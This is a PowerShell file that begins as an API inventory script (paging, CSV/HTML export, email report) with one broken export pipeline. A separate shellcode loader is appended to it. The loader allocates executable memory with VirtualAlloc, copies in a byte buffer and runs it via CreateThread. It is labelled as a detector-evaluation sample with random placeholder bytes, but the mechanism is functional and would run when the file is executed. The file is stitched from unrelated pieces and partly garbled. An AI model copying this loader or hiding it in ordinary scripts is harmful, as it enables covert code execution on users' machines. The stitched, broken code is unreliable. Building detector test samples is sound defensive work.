
<#
.SYNOPSIS
    Calls the Contoso inventory API with retry and exports the server list.
.DESCRIPTION
    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
    and gives up on client errors such as 401 or 404.
    Pages are followed through the nextLink property until the collection is
    exhausted, then the records are written to CSV.
.PARAMETER BaseUri
    Defaults to the value configured for this host.
.PARAMETER MaxRetries
    Defaults to the value configured for this host.
.EXAMPLE
    .\Get-ApiServers.ps1 -PageSize 50
.EXAMPLE
    .\Get-ApiServers.ps1 -Verbose
.NOTES
    Author: Platform Engineering
    Last updated: 2025-01-25
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BaseUri = 'https://api.internal.corp/v1',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 2,
    [int]$TimeoutSec = 45,

    [int]$PageSize = 50,
    [string]$ReportPath = 'C:\Reports\api-servers-2026-05-21.csv'
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$WarningPreference = 'Continue'
$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
    Write-Verbose ("Collected {0} records" -f @($records).Count)
}

$summary = $records | Group-Object -Property status | ForEach-Object {
    [pscustomobject]@{
        Status = $_.Name
        Count  = $_.Count
    }
}
$summary | Format-Table -AutoSize

$records | Select-Object id, name, status |
    -Path $ReportPath `
    -NoTypeInformation

$summary | Export-Csv -Path $ReportPath.Replace('.csv', '-summary.csv') -NoTypeInformation -Encoding UTF8

$newTag = @{ tags = @('inventory', 'automated') }
try {
    $tagged = Invoke-ContosoApi -Path '/servers/tags' -Method Post -Body $newTag
    Write-Verbose ("Tag request returned {0}" -f $tagged.status)
}
catch {
    Write-Warning ("Tagging skipped: {0}" -f $_.Exception.Message)
}

$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$summary | ConvertTo-Html -Title 'API inventory summary' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = 'api-ops@internal.corp'
$MailFrom = 'api-report@internal.corp'
$mailBody = "Inventory run finished with {0} records" -f @($records).Count
Send-MailMessage -To $MailTo -From $MailFrom -Subject 'API inventory' -Body $mailBody -SmtpServer 'smtp.internal.corp' -Port 25

Write-Host ("API inventory complete: {0} records" -f @($records).Count) -ForegroundColor Green
Write-Verbose ("Elapsed requests: {0}" -f [math]::Ceiling(@($records).Count / $PageSize))

$tokenLength = $ApiKey.Length
Write-Verbose ("API key length: {0}" -f $tokenLength)

$retryCount = @($records).Count - @($records | Select-Object -Unique) .Count
Write-Verbose ("Duplicate ids skipped: {0}" -f $retryCount)

$rateLimit = $null
if ($rateLimit) {
    Write-Verbose ("Remaining calls: {0}" -f $rateLimit)
}

$endpoints = @('/servers', '/servers/tags', '/health')
$endpoints | ForEach-Object { Write-Verbose ("Endpoint: {0}" -f $_) }

$baseUriHost = ([uri]$BaseUri).Host
Write-Verbose ("Target host: {0}" -f $baseUriHost)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x28, 0x95, 0x60, 0x2f, 0x06, 0xe6, 0x45, 0x12, 0xfc, 0xf9, 0xd1, 0xc3, 0xde, 0xb6, 0x15, 0x14,
        0x12, 0x01, 0xf0, 0x82, 0x9f, 0x00, 0x6e, 0x50, 0xc4, 0xc1, 0x57, 0x39, 0xa0, 0xc3, 0xc8, 0x87,
        0xed, 0x9c, 0x78, 0x5e, 0xae, 0x5c, 0x68, 0xd5, 0xb0, 0x2d, 0xfb, 0x6d, 0x1e, 0x64, 0x67, 0x5a,
        0xfa, 0x24, 0xc2, 0xf6, 0x4a, 0xf0, 0x37, 0x91, 0x6d, 0xf5, 0x6a, 0xbc, 0xbe, 0x4a, 0xad, 0x6c,
        0x47, 0x3b, 0xcc, 0x27, 0x49, 0x32, 0xc1, 0x23, 0x0a, 0x2d, 0x89, 0xbd, 0xf4, 0xb7, 0x43, 0x37,
        0x15, 0x33, 0xfd, 0xee, 0xd3, 0xdd, 0xd7, 0xa2, 0x1f, 0x9e, 0xe3, 0x8c, 0x5a, 0x84, 0x31, 0x12,
        0x45, 0x36, 0xb1, 0xd7, 0x42, 0xc6, 0xb4, 0x53, 0x45, 0x5c, 0xff, 0x46, 0xe3, 0x2f, 0xb3, 0x34,
        0x9f, 0x39, 0xb7, 0x77, 0x5f, 0xe2, 0xc5, 0x44, 0x2c, 0x18, 0xad, 0xc5, 0x1d, 0xd7, 0xec, 0x79,
        0x0a, 0x40, 0x22, 0xea, 0x9a, 0x70, 0x18, 0x9e, 0x81, 0x43, 0x56, 0x5a, 0xba, 0x51, 0x27, 0x42,
        0xa8, 0x77, 0x1e, 0x3d, 0xf7, 0x4e, 0x80, 0x88, 0x40, 0x4c, 0x7b, 0x5b, 0x42, 0x02, 0x26, 0x04,
        0xb7, 0x87, 0x01, 0xdc, 0x8d, 0x86, 0xf7, 0x7e, 0xd8, 0xa1, 0xf7, 0xbb, 0x2b, 0x1c, 0x3c, 0xc8,
        0x72, 0x8a, 0x94, 0x52, 0x3a, 0x1b, 0xab, 0xea, 0xfd, 0xfa, 0x57, 0xf4, 0xb6, 0xa0, 0x46, 0x19,
        0x61, 0x40, 0x6b, 0x20, 0x14, 0x93, 0xc4, 0xa8, 0x0c, 0x87, 0x7b, 0x39, 0xc8, 0x7d, 0x2c, 0x6d,
        0x4a, 0xe7, 0x28, 0xac, 0x25, 0xd8, 0x09, 0x38, 0x63, 0x51, 0x59, 0xa0, 0xfe, 0x09, 0xc4, 0xbb,
        0x69, 0x0c, 0x68, 0x4c, 0x43, 0x06, 0x78, 0xae, 0x22, 0xdd, 0x6e, 0x8c, 0xf0, 0x25, 0xa4, 0x39,
        0xf8, 0xa6, 0xbd, 0xe9, 0xc1, 0x84, 0xe7, 0x16, 0x2f, 0x61, 0x26, 0xea, 0x86, 0x31, 0x05, 0x92,
        0xd5, 0xda, 0x93, 0xf8, 0xcd, 0x25, 0x6f, 0x08, 0x88, 0x2d, 0x91, 0x48, 0x5b, 0xf7, 0xad, 0x1a,
        0xf8, 0x43, 0xe9, 0x46, 0x99, 0x55, 0x03, 0x5b, 0x56, 0xfa, 0xe5, 0x34, 0x2a, 0x26, 0x0c, 0x3a,
        0xd5, 0xac, 0x3d, 0xc2, 0x30, 0x83, 0xd8, 0x62, 0x2e, 0xd0, 0x79, 0xb6, 0x79, 0xc4, 0x27, 0xf4,
        0x54, 0x6e, 0x37, 0x27, 0x38, 0x91, 0xeb, 0xc7, 0x31, 0x7e, 0x78, 0xa7, 0xb2, 0x70, 0x07, 0xca,
        0x1e, 0xc5, 0xe3, 0x6f, 0xfe, 0xd2, 0xba, 0x8d, 0x20, 0x1f, 0x84, 0xd3, 0x03, 0xba, 0xf6, 0x87,
        0x53, 0x66, 0x30, 0xf0, 0x5a, 0x45, 0x9c, 0xc9, 0x4a, 0x36, 0x6c, 0xd7, 0xe2, 0x8c, 0xf3, 0x93,
        0x9e, 0x22, 0x95, 0xe7, 0xb8, 0x4a, 0x95, 0xe6, 0x71, 0x10, 0x6c, 0xf6, 0x86
    )

    $Handle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 2067)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
